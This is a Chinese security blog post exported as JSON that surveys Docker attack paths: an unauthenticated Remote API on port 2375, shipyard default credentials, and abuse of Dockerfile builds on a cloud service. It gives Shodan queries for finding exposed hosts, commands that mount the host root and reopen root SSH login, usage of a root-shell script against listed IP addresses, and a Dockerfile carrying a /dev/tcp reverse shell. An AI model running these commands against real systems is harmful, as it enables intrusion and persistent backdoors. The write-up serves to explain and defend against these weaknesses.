{"title":"Docker容器漏洞研究与介绍总结","slug":"网安大类/Vulnerable/Appllication/容器云化/Docker容器漏洞研究与介绍总结","date":"2019-08-08T01:32:30.000Z","updated":"2022-03-29T05:39:05.028Z","url":"2019/8-8-569.html","path":"api/articles/2019/8-8-569.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210616100459.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210616111758.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210617110545.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h2 id=\"0x00-未授权访问类漏洞\"><a href=\"#0x00-未授权访问类漏洞\" class=\"headerlink\" title=\"0x00 未授权访问类漏洞\"></a>0x00 未授权访问类漏洞</h2><h3 id=\"1-Docker-Remote-API-未授权访问漏洞\"><a href=\"#1-Docker-Remote-API-未授权访问漏洞\" class=\"headerlink\" title=\"1) Docker Remote API 未授权访问漏洞\"></a>1) Docker Remote API 未授权访问漏洞</h3><p>描述: 由于docker安装后是默认不允许远程访问的，所以很多小白可能就直接搜索网上的文章开启dcoker远程访问，然后照着操作。虽然这样可以远程访问了，但是直接暴露在公网上的2375端口是非常危险的，导致所有人都可以远程操作这台主机上的Docker。</p>\n<p><strong>漏洞说明:</strong><br>漏洞原因: 由于Docker Engine Daemon api 或 Docker swarm进行Docker集群管理时其 Docker Remote API 直接暴露公网且未设置访问限制导致。<br>漏洞特征: 使用标准的<code>Docker API</code>节点上会开放一个绋定在0.0.0.0上TCP端口2375<br>被利用特征: EXIN挖矿、木马植入、肉鸡</p>\n<p><br></p>\n<p><strong>漏洞环境:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210616100459.png\" alt=\"WeiyiGeek.开启远程管理端口\" title=\"\" class=\"\">\n                <p>WeiyiGeek.开启远程管理端口</p>\n            </figure></p>\n<p><br></p>\n<p><strong>漏洞搜寻</strong><br>描述: 我们可以自建漏洞环境或者直接在公网上找开放了2375端口的主机进行演示(不建议)。</p>\n<ul>\n<li>1) 利用 shodan 搜寻以我搜索的关键字为例，最后要加上docker关键字排除2375端口被用作其他用途的情况，提高搜索准确率。<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">port:<span class=\"string\">\"2375\"</span> country:<span class=\"string\">\"JP\"</span> Docker</span><br><span class=\"line\">port:<span class=\"string\">\"2375\"</span> X-Content-Type-Options: nosniff country:<span class=\"string\">\"CN\"</span></span><br></pre></td></tr></table></figure></li>\n<li>2) 如果在内网之中存在Docker Swarm集群的需要非常的注意2375访问限制。</li>\n</ul>\n<p><br></p>\n<p><strong>漏洞利用</strong></p>\n<ul>\n<li><p>1) 采用http请求验证例如运行、删除container、拉取image等等</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:2375/version</span><br><span class=\"line\">http://127.0.0.1:2375/containers/json  </span><br><span class=\"line\">http://127.0.0.1:2375/containers/json?all=1   <span class=\"comment\"># 查看相关docker服务</span></span><br><span class=\"line\">http://127.0.0.1:2375/containers/Id/json      <span class=\"comment\"># 可以进一步通过ID访问服务细节</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>2) 采用Docker Client进行远程访问docker并进入到容器Shell终端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># - 获取镜像以及容器运行信息</span></span><br><span class=\"line\">docker -H tcp://180.76.161.55:2375 images</span><br><span class=\"line\">docker -H tcp://180.76.161.55:2375 ps</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># - 直接在容器中执行命令</span></span><br><span class=\"line\">docker -H tcp://180.76.161.55:2375 run -it --entrypoint /bin/bash ubuntu <span class=\"string\">\"-h\"</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># - 在对方VPS主机上创建一个busybox的容器,需要查看Docker是否以root权限运行，Docker在运行一个容器的时候可以将宿主机上的一个目录挂载到容器内的一个目录并写入公钥。</span></span><br><span class=\"line\">docker -H tcp://vps的ip run --rm -privileged -it -v /:/mnt busybox chroot /mnt sh</span><br><span class=\"line\">chattr -aui /root/.ssh/authorized_keys</span><br><span class=\"line\">chmod +600 /root/.ssh/authorized_keys</span><br><span class=\"line\">sed -i -e <span class=\"string\">'s/\\#Port 22/Port 22/g'</span> -e <span class=\"string\">'/^Port 22/a\\Port 2433'</span> -e <span class=\"string\">'s/\\#PermitRootLogin/PermitRootLogin/g'</span> -e <span class=\"string\">'s/PermitRootLogin no/PermitRootLogin yes/g'</span> -e <span class=\"string\">'s/PermitRootLogin without-password/PermitRootLogin yes/g'</span> -e <span class=\"string\">'s/PermitRootLogin prohibit-password/PermitRootLogin yes/g'</span> -e <span class=\"string\">'s/PasswordAuthentication no/PasswordAuthentication yes/g'</span> -e <span class=\"string\">'s/GSSAPIAuthentication yes/GSSAPIAuthentication no/g'</span> -e <span class=\"string\">'s/GSSAPICleanupCredentials yes/GSSAPICleanupCredentials no/g'</span> /etc/ssh/sshd_config</span><br><span class=\"line\">systemctl restart sshd</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210616111758.png\" alt=\"WeiyiGeek.ssh公钥认证\" title=\"\" class=\"\">\n                <p>WeiyiGeek.ssh公钥认证</p>\n            </figure>\n<ul>\n<li><p>3) 直接采用API方式进行管理(<code>注意需要根据Docker Server的版本来确定,验证时建议只查询</code>)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1&amp;stdin=1&amp;stdout=1&amp;stream=1 HTTP/1.1</span><br><span class=\"line\">Host: 123.125.105.158:2375</span><br><span class=\"line\">User-Agent: Docker-Client/1.7.0 (windows)</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>4) 除了上述的利用方法外我们也可以参考以下方式</p>\n<ul>\n<li>4.1 有些服务器不允许root登录，可以写入其他用户的.ssh/目录下<code>通过查看/etc/ssh/sshd_config</code>目录，然后修改<code>/etc/sudoer</code>中的文件，配置为sudo免密码切换为root。</li>\n<li>4.2 通过crontab写计划任务反弹shell<br><br></li>\n</ul>\n</li>\n</ul>\n<p><strong>利用POC及工具</strong></p>\n<ul>\n<li>dockerRemoteApiGetRootShell.py 脚本工具<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看服务端api版本</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -V</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看运行的容器</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 115.159.43.140 -p 2375</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 查看所有的容器</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -a</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 查看所有镜像</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -l</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 查看端口映射</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 写计划任务（centos,redhat等,加-u参数用于ubuntu等）  REPOSITORY</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口</span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 写sshkey(自行修改脚本的中公钥) IMAGE ID</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 43.254.53.221 -p 2375 -C -i IMAGE ID -k</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 在容器中执行命令</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 120.24.45.47 -p 2375 -e <span class=\"string\">\"id\"</span> -I f5d1d4b02565</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除容器</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -c -I 容器id</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 修改client api版本</span></span><br><span class=\"line\">python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -v 1.22</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n<h2 id=\"0x01-系统脆弱性口令类漏洞\"><a href=\"#0x01-系统脆弱性口令类漏洞\" class=\"headerlink\" title=\"0x01 系统脆弱性口令类漏洞\"></a>0x01 系统脆弱性口令类漏洞</h2><h3 id=\"Docker-WEB管理之-shipyard-弱口令利用\"><a href=\"#Docker-WEB管理之-shipyard-弱口令利用\" class=\"headerlink\" title=\"Docker WEB管理之 shipyard 弱口令利用\"></a>Docker WEB管理之 shipyard 弱口令利用</h3><p>描述: shipyard 是一款 Docker WEB 管理工具</p>\n<p><strong>漏洞特征:</strong></p>\n<ul>\n<li>默认账号密码:<code>admin/shipyard</code></li>\n<li>开放端口: 8080</li>\n<li>验证路径: <ul>\n<li><a href=\"http://127.0.0.1:8089/#/login\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8089/#/login</a></li>\n<li><a href=\"http://127.0.0.1:8080/#engines\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/#engines</a></li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210617110545.png\" alt=\"WeiyiGeek.shipyard\"></p>\n<hr>\n<h2 id=\"0x02-共有云服务提供商\"><a href=\"#0x02-共有云服务提供商\" class=\"headerlink\" title=\"0x02 共有云服务提供商\"></a>0x02 共有云服务提供商</h2><h3 id=\"Docker云服务设计脆弱性利用\"><a href=\"#Docker云服务设计脆弱性利用\" class=\"headerlink\" title=\"Docker云服务设计脆弱性利用\"></a>Docker云服务设计脆弱性利用</h3><p>描述: 在2016年时网易蜂巢为开发者打造的基于Docker的容器云，全SSD助力极速打造云端应用！</p>\n<p><strong>漏洞特征:</strong></p>\n<ul>\n<li>1) 创建镜像的支持方式例如自定义拉取共有仓库、或者使用dockfile进行构建(可以利用其进行任何命令执行), 风险点: 管理或自有服务的api需要和用户环境隔离。</li>\n</ul>\n<p><strong>漏洞利用:</strong></p>\n<ul>\n<li>1) Dockfile 构建时执行任意命令可反弹Shell<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Memcached</span></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> ubuntu</span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> sleep 1</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> cat /etc/passwd</span></span><br><span class=\"line\"><span class=\"comment\"># make sure the package repository is up to date</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> <span class=\"built_in\">echo</span> <span class=\"string\">\"deb http://mirrors.163.com/ubuntu/ precise main restricted universe multiverse\"</span> &gt; /etc/apt/sources.list</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> <span class=\"built_in\">echo</span> <span class=\"string\">\"while ((1));do sleep 1;echo 111;/bin/sh -i &gt;&amp; /dev/tcp/1.1.1.1/1234 0&gt;&amp;1;done\"</span> &gt;&gt; /tmp/1.sh</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> bash /tmp/1.sh</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> sleep 20</span></span><br><span class=\"line\"><span class=\"comment\"># install memcached</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get install -y memcached</span></span><br><span class=\"line\"><span class=\"comment\"># Launch memcached when launching the container</span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"bash\"> [<span class=\"string\">\"memcached\"</span>]</span></span><br><span class=\"line\"><span class=\"comment\"># run memcached as the daemon user</span></span><br><span class=\"line\"><span class=\"keyword\">USER</span> daemon</span><br><span class=\"line\"><span class=\"comment\"># expose memcached port</span></span><br><span class=\"line\"><span class=\"keyword\">EXPOSE</span> <span class=\"number\">11211</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"Vulnerable","path":"api/categories/Vulnerable.json"},{"name":"Security","path":"api/categories/Security.json"}],"tags":[{"name":"Docker","path":"api/tags/Docker.json"}]}